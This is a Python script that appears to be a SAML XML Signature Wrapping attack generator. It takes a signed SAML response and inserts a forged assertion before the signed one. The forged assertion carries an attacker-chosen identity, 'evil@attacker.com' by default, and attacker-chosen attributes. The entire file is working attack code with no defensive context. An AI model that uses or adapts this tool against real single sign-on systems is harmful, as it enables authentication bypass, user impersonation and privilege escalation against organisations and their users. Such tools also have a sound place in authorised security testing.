#!/usr/bin/env python3

import argparse
from lxml import etree
from copy import deepcopy
from pathlib import Path

def build_malicious_assertion(name_id="evil@attacker.com", attributes=None):
    nsmap = {
        "saml": "urn:oasis:names:tc:SAML:2.0:assertion"
    }
    assertion = etree.Element("{urn:oasis:names:tc:SAML:2.0:assertion}Assertion", nsmap=nsmap)
    assertion.set("ID", "_malicious")
    subject = etree.SubElement(assertion, "{urn:oasis:names:tc:SAML:2.0:assertion}Subject")
    name_id_elem = etree.SubElement(subject, "{urn:oasis:names:tc:SAML:2.0:assertion}NameID")
    name_id_elem.text = name_id

    if attributes:
        attr_stmt = etree.SubElement(assertion, "{urn:oasis:names:tc:SAML:2.0:assertion}AttributeStatement")
        for key, value in attributes.items():
            attr = etree.SubElement(attr_stmt, "{urn:oasis:names:tc:SAML:2.0:assertion}Attribute", Name=key)
            attr_value = etree.SubElement(attr, "{urn:oasis:names:tc:SAML:2.0:assertion}AttributeValue")
            attr_value.text = value

    return assertion

def inject_xsw(xml_path, output_path, name_id, attributes):
    parser = etree.XMLParser(remove_blank_text=True)
    tree = etree.parse(xml_path, parser)
    root = tree.getroot()

    # Find original signed Assertion
    original_assertions = root.xpath("//*[local-name()='Assertion']")
    if not original_assertions:
        print("No <Assertion> found in the XML.")
        return

    target_assertion = original_assertions[0]

    # Build malicious one and insert before
    malicious = build_malicious_assertion(name_id, attributes)
    parent = target_assertion.getparent()
    parent.insert(parent.index(target_assertion), malicious)

    Path(output_path).write_text(etree.tostring(tree, pretty_print=True, encoding='unicode'))
    print(f"Injected malicious assertion above signed one: {output_path}")

def main():
    parser = argparse.ArgumentParser(description="SAML XSW Generator: Injects malicious assertion before signed one")
    parser.add_argument("--input", help="Path to original signed SAML XML")
    parser.add_argument("--output", help="Path to write modified XML")
    parser.add_argument("--nameid", default="evil@attacker.com", help="Attacker NameID")
    parser.add_argument("--attr", action='append', help="Attribute in the form key=value")

    args = parser.parse_args()
    attr_dict = {}
    if args.attr:
        for item in args.attr:
            key, value = item.split("=", 1)
            attr_dict[key] = value

    inject_xsw(args.input, args.output, args.nameid, attr_dict)

if __name__ == "__main__":
    main()

